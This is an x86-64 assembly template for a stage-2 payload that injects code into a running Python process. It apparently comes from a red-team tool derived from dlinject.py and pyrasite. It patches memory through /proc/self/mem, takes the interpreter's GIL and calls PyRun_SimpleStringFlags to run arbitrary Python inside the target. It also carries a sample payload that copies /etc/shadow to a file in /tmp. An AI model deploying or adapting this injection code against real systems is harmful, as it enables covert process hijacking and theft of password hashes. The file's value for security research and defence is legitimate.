.intel_syntax noprefix
.globl _start
_start:

// Based on the stage 2 code included with dlinject.py
// and in part on https://github.com/lmacken/pyrasite/blob/d0c90ab38a8986527c9c1f24e222323494ab17a2/pyrasite/injector.py
// relative offsets for the following libraries required:
//		/usr/bin/pythonN.N (same version as target process)
cld

	fxsave moar_regs[rip]

	// Open /proc/self/mem
	mov rax, 2                   # SYS_OPEN
	lea rdi, proc_self_mem[rip]  # path
	mov rsi, 2                   # flags (O_RDWR)
	xor rdx, rdx                 # mode
	syscall
	mov r15, rax  # save the fd for later

	// seek to code
	mov rax, 8      # SYS_LSEEK
	mov rdi, r15    # fd
	mov rsi, [VARIABLE:RIP:VARIABLE]  # offset
	xor rdx, rdx    # whence (SEEK_SET)
	syscall

	// restore code
	mov rax, 1                   # SYS_WRITE
	mov rdi, r15                 # fd
	lea rsi, old_code[rip]       # buf
	mov rdx, [VARIABLE:LEN_CODE_BACKUP:VARIABLE]   # count
	syscall

	// close /proc/self/mem
	mov rax, 3    # SYS_CLOSE
	mov rdi, r15  # fd
	syscall

	// move pushed regs to our new stack
	lea rdi, new_stack_base[rip-[VARIABLE:STACK_BACKUP_SIZE:VARIABLE]]
	mov rsi, [VARIABLE:RSP_MINUS_STACK_BACKUP_SIZE:VARIABLE]
	mov rcx, [VARIABLE:STACK_BACKUP_SIZE:VARIABLE]
	rep movsb

	// restore original stack
	mov rdi, [VARIABLE:RSP_MINUS_STACK_BACKUP_SIZE:VARIABLE]
	lea rsi, old_stack[rip]
	mov rcx, [VARIABLE:STACK_BACKUP_SIZE:VARIABLE]
	rep movsb

	lea rsp, new_stack_base[rip-[VARIABLE:STACK_BACKUP_SIZE:VARIABLE]]
	
	//debug
	mov rax,1 # write to file
	mov rdi,1 # stdout
	mov rdx,1 # number of bytes
	lea rsi, dmsg[rip] #from buffer
	syscall
	///debug

	# // BEGIN: call Py_Initialize()
	# push rbx
	# mov rbx, [BASEADDRESS:.+/python[0-9\.]+$:BASEADDRESS] + [RELATIVEOFFSET:Py_Initialize:RELATIVEOFFSET]
	# call rbx
	# pop rbx
	# // END: call Py_Initialize()

	//debug
	mov rax,1 # write to file
	mov rdi,1 # stdout
	mov rdx,1 # number of bytes
	lea rsi, dmsg[rip] + 1 #from buffer
	syscall
	///debug

	// BEGIN: call PyGILState_Ensure() and store the handle it returns
	//push rbx
	xor rax, rax
	mov rdi, 0
	mov rsi, 0
	mov rbx, [BASEADDRESS:.+/python[0-9\.]+$:BASEADDRESS] + [RELATIVEOFFSET:PyGILState_Ensure:RELATIVEOFFSET]
	call rbx
	mov varPythonHandle[rip], rax
	//pop rbx
	// END: call PyGILState_Ensure()
	
	//debug
	mov rax,1 # write to file
	mov rdi,1 # stdout
	mov rdx,1 # number of bytes
	lea rsi, dmsg[rip] + 2 #from buffer
	syscall
	///debug

	// BEGIN: call PyRun_SimpleString("arbitrary Python code here")
	push rbx
	mov rsi, 0
	lea rdi, python_code[rip]
	sub rsp, 8
	mov [rsp], rdi
	mov rax, varPythonHandle[rip]
	mov rbx, [BASEADDRESS:.+/python[0-9\.]+$:BASEADDRESS] + [RELATIVEOFFSET:PyRun_SimpleStringFlags:RELATIVEOFFSET]
	call rbx
	//pop rdi
	pop rbx
	// END: call PyRun_SimpleString("arbitrary Python code here")
	
	//debug
	mov rax,1 # write to file
	mov rdi,1 # stdout
	mov rdx,1 # number of bytes
	lea rsi, dmsg[rip] + 3 #from buffer
	syscall
	///debug
	
	// BEGIN: call PyGILState_Release(handle)
	push rbx
	lea rax, varPythonHandle[rip]
	mov rdi, rax
	mov rbx, [BASEADDRESS:.+/python[0-9\.]+$:BASEADDRESS] + [RELATIVEOFFSET:PyGILState_Release:RELATIVEOFFSET]
	call rbx
	pop rbx
	// END: call PyGILState_Release(handle)
		
	//debug
	mov rax,1 # write to file
	mov rdi,1 # stdout
	mov rdx,1 # number of bytes
	lea rsi, dmsg[rip] + 4 #from buffer
	syscall
	///debug
	
	# // BEGIN: call Py_Finalize()
	# push rbx
	# mov rax, 0
	# mov rdi, rax
	# mov rbx, [BASEADDRESS:.+/python[0-9\.]+$:BASEADDRESS] + [RELATIVEOFFSET:Py_Finalize:RELATIVEOFFSET]
	# call rbx
	# pop rbx
	# // END: call Py_Finalize()
	
	//debug
	mov rax,1 # write to file
	mov rdi,1 # stdout
	mov rdx,1 # number of bytes
	lea rsi, dmsg[rip] + 5 #from buffer
	syscall
	///debug
	
	mov rax, 0

	fxrstor moar_regs[rip]
	pop r15
	pop r14
	pop r13
	pop r12
	pop r11
	pop r10
	pop r9
	pop r8
	pop rdi
	pop rsi
	pop rbp
	pop rdx
	pop rcx
	pop rbx
	pop rax
	popf

	mov rsp, [VARIABLE:RSP:VARIABLE]
	jmp old_rip[rip]

old_rip:
	.quad [VARIABLE:RIP:VARIABLE]

old_code:
	.byte [VARIABLE:CODE_BACKUP_JOIN:VARIABLE]

old_stack:
	.byte [VARIABLE:STACK_BACKUP_JOIN:VARIABLE]

	.align 16
moar_regs:
	.space 512

proc_self_mem:
	.ascii "/proc/self/mem\0"
	
python_code1:
	.ascii "print('OK');\0"

python_code2:
	.ascii "import os; import sys; finput = open('/etc/shadow', 'rb'); foutput = open('/tmp/bishop_fox.dat', 'wb'); foutput.write(finput.read()); foutput.close(); finput.close();\0"

python_code:
	.ascii "[VARIABLE:pythoncode:VARIABLE]\0"

format_string:
	.ascii "DEBUG: %s\0"

dmsg:
	.ascii "123456789ABCDEF\0"
	
varPythonHandle:
	.space 8
	.align 16
	
new_stack:
	.balign 0x8000

new_stack_base:


